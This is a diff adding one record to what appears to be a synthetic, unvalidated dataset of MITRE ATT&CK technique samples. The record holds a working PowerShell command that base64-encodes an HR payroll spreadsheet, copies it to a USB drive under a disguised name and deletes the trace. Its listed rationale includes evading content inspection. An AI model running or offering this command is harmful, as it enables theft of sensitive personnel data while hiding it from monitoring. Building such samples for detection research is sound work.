@@ -1,0 +1,24 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$usb=((Get-CimInstance Win32_LogicalDisk -Filter \"DriveType=2\" | Select -First 1 -ExpandProperty DeviceID)+'\\'); $enc=Join-Path $env:TEMP 'payroll.b64'; $bytes=[IO.File]::ReadAllBytes(\"$env:USERPROFILE\\Desktop\\HR\\payroll.xlsx\"); [IO.File]::WriteAllText($enc,[Convert]::ToBase64String($bytes)); New-Item -ItemType Directory -Force -Path (Join-Path $usb 'Reports') | Out-Null; Copy-Item $enc (Join-Path $usb 'Reports\\q1_report.txt') -Force; Remove-Item $enc -Force",
+  "explanation": "Base64-encodes a sensitive spreadsheet and stores it as a text file on the removable drive under an innocuous folder, using Copy-Item. Uses only local operations.",
+  "rationale_steps": [
+    "Locate removable media via WMI",
+    "Base64-encode the target to evade simple content inspection",
+    "Create a benign-looking folder on the USB",
+    "Copy the encoded data with Copy-Item",
+    "Remove local encoded artifact"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-1ea95c55-f69d8eff",
+  "source_prompt_hash": "1ea95c55",
+  "timestamp_utc": "2025-09-30T05:10:56.829613Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
